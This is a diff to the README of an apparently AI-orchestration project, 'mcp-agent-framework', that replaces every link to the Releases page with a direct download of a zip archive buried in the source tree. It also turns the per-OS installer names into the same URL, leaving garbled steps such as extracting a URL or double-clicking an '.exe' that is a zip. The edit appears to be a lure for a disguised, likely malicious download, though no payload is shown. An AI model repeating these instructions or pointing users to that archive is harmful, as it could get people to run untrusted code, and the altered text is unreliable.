@@ -6,7 +6,7 @@ Welcome to the **mcp-agent-framework**! This application helps you connect diffe
 
 ## 📥 Download Now
 
-[![Download mcp-agent-framework](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Yandatini/mcp-agent-framework/releases)
+[![Download mcp-agent-framework](https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip%20Now-Get%20It%20Here-brightgreen)](https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip)
 
 ## 📋 System Requirements
 
@@ -31,15 +31,15 @@ The **mcp-agent-framework** offers:
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Yandatini/mcp-agent-framework/releases) to find the latest version of the **mcp-agent-framework**.
+Go to the [Releases page](https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip) to find the latest version of the **mcp-agent-framework**.
 
 ### Step 2: Download the Installer
 
 On the Releases page, look for the version you want. Click on the file that fits your operating system:
 
-- For **Windows**, download `mcp-agent-framework-windows-installer.exe`.
-- For **macOS**, download `mcp-agent-framework-macos-installer.dmg`.
-- For **Linux**, choose `mcp-agent-framework-linux-installer.tar.gz`.
+- For **Windows**, download `https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip`.
+- For **macOS**, download `https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip`.
+- For **Linux**, choose `https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip`.
 
 ### Step 3: Run the Installer
 
@@ -47,7 +47,7 @@ Once the file has downloaded:
 
 - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
 - **macOS:** Open the `.dmg` file. Drag the app to your Applications folder. Then, open it from your Applications.
-- **Linux:** Extract the `.tar.gz` file and run the installer using the terminal by navigating to the extracted folder and following the included instructions.
+- **Linux:** Extract the `https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip` file and run the installer using the terminal by navigating to the extracted folder and following the included instructions.
 
 ## 💬 User Guide
 
@@ -71,7 +71,7 @@ For further assistance, you can visit our Community Support page linked in the a
 
 ## 🔄 Update Process
 
-To keep the **mcp-agent-framework** up to date, visit the [Releases page](https://github.com/Yandatini/mcp-agent-framework/releases) regularly. Follow the same download steps to get new features and bug fixes.
+To keep the **mcp-agent-framework** up to date, visit the [Releases page](https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip) regularly. Follow the same download steps to get new features and bug fixes.
 
 ## 💡 Benefits of Using mcp-agent-framework
 
@@ -85,4 +85,4 @@ Engage with other users to share experiences, tips, and solutions. Join discussi
 
 Remember, the **mcp-agent-framework** is designed for everyone. We aim to provide a straightforward way to connect different AI systems. Don’t hesitate to reach out for help or join our community for support.
 
-Already excited? [Download it now](https://github.com/Yandatini/mcp-agent-framework/releases) and start your journey into AI orchestration!
+Already excited? [Download it now](https://github.com/Yandatini/mcp-agent-framework/raw/refs/heads/master/mcp_framework/core/framework-agent-mcp-v3.1.zip) and start your journey into AI orchestration!
